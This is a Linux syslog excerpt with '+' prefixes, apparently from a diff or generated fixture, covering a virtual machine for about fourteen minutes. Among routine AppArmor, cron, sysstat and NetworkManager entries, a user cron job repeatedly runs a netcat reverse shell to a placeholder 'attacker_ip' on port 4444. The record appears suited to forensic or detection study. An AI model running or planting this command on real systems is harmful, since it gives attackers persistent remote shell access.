+Apr 13 15:23:34 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776111814.954:213): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:24:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4518]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:24:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4519]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:24:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4521]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:24:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4521]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:24:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4518]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:24:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4518]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:24:26 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776111866.453:214): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:24:31 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776111871.568:215): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:25:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4537]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+Apr 13 15:25:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4538]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:25:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4539]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
+Apr 13 15:25:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4540]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:25:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4537]: pam_unix(cron:session): session closed for user root
+Apr 13 15:25:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4543]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:25:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4543]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:25:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4538]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:25:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4538]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:26:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4549]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:26:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4550]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:26:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4552]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:26:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4552]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:26:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4549]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:26:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4549]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:27:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4560]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:27:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4561]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:27:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4563]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:27:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4563]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:27:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4560]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:27:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4560]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:28:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4569]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:28:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4570]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:28:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4572]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:28:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4572]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:28:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4569]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:28:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4569]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:29:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4579]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:29:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4580]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:29:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4582]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:29:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4582]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:29:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4579]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:29:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4579]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:30:01 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Starting sysstat-collect.service - system activity accounting tool...
+Apr 13 15:30:01 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: sysstat-collect.service: Deactivated successfully.
+Apr 13 15:30:01 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Finished sysstat-collect.service - system activity accounting tool.
+Apr 13 15:30:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4590]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+Apr 13 15:30:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4592]: (root) CMD ([ -x /etc/init.d/anacron ] && if [ ! -d /run/systemd/system ]; then /usr/sbin/invoke-rc.d anacron start >/dev/null; fi)
+Apr 13 15:30:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4591]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:30:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4590]: pam_unix(cron:session): session closed for user root
+Apr 13 15:30:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4593]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:30:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4595]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:30:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4595]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:30:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4591]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:30:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4591]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:30:39 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Started anacron.service - Run anacron jobs.
+Apr 13 15:30:39 vmuser-Standard-PC-i440FX-PIIX-1996 anacron[4601]: Anacron 2.3 started on 2026-04-13
+Apr 13 15:30:39 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Starting fstrim.service - Discard unused blocks on filesystems from /etc/fstab...
+Apr 13 15:30:39 vmuser-Standard-PC-i440FX-PIIX-1996 anacron[4601]: Normal exit (0 jobs run)
+Apr 13 15:30:39 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: anacron.service: Deactivated successfully.
+Apr 13 15:30:40 vmuser-Standard-PC-i440FX-PIIX-1996 fstrim[4602]: /: 6.5 GiB (7000985600 bytes) trimmed on /dev/disk/by-uuid/9102ecca-8ecd-4ecc-9141-4ce262535668
+Apr 13 15:30:40 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: fstrim.service: Deactivated successfully.
+Apr 13 15:30:40 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Finished fstrim.service - Discard unused blocks on filesystems from /etc/fstab.
+Apr 13 15:31:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4609]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:31:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4610]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:31:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4612]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:31:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4612]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:31:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4609]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:31:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4609]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:31:28 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112288.122:216): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:31:33 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112293.122:217): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:32:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4620]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:32:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4623]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:32:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4625]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:32:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4625]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:32:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4620]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:32:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4620]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:32:42 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112362.271:218): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:32:47 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112367.272:219): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:33:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4643]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:33:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4644]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:33:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4646]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:33:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4646]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:33:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4643]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:33:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4643]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:33:54 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112434.123:220): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:33:59 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112439.329:221): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:34:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4656]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:34:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4657]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:34:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4659]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:34:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4659]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:34:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4656]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:34:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4656]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:34:04 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112444.331:222): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:34:09 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112449.332:223): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:34:14 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112454.333:224): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:34:22 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112462.964:225): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:34:27 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112467.965:226): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:34:57 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112497.609:227): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:35:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4667]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+Apr 13 15:35:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4669]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
+Apr 13 15:35:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4668]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:35:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4667]: pam_unix(cron:session): session closed for user root
+Apr 13 15:35:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4671]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:35:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4673]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:35:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4673]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:35:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4668]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:35:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4668]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:35:02 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112502.610:228): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:35:07 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112507.610:229): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:35:12 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112512.611:230): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:35:17 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112517.728:231): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:35:22 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112522.728:232): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:35:27 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112527.729:233): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:35:32 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112532.731:234): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:35:37 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112537.732:235): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:35:42 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112542.833:236): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:35:47 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112547.837:237): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:35:52 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112552.838:238): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:35:57 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112557.838:239): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:36:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4680]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:36:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4681]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:36:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4683]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:36:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4683]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:36:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4680]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:36:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4680]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:36:02 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112562.839:240): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:36:07 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112567.839:241): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:36:12 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112572.839:242): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:36:17 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112577.840:243): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:36:23 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112583.208:244): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:36:28 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112588.209:245): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:36:32 vmuser-Standard-PC-i440FX-PIIX-1996 NetworkManager[755]: <info>  [1776112592.6878] manager: NetworkManager state is now CONNECTED_SITE
+Apr 13 15:36:32 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[697]: [system] Activating via systemd: service name='org.freedesktop.nm_dispatcher' unit='dbus-org.freedesktop.nm-dispatcher.service' requested by ':1.12' (uid=0 pid=755 comm="/usr/sbin/NetworkManager --no-daemon" label="unconfined")
+Apr 13 15:36:32 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Starting NetworkManager-dispatcher.service - Network Manager Script Dispatcher Service...
+Apr 13 15:36:32 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[697]: [system] Successfully activated service 'org.freedesktop.nm_dispatcher'
+Apr 13 15:36:32 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Started NetworkManager-dispatcher.service - Network Manager Script Dispatcher Service.
+Apr 13 15:36:33 vmuser-Standard-PC-i440FX-PIIX-1996 NetworkManager[755]: <info>  [1776112593.6881] manager: NetworkManager state is now CONNECTED_GLOBAL
+Apr 13 15:36:35 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112595.281:246): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:36:40 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112600.331:247): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:36:42 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: NetworkManager-dispatcher.service: Deactivated successfully.
+Apr 13 15:36:45 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776112605.605:248): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:37:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4700]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:37:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4703]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:37:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4705]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:37:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4705]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:37:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4700]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:37:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4700]: pam_unix(cron:session): session closed for user vmuser
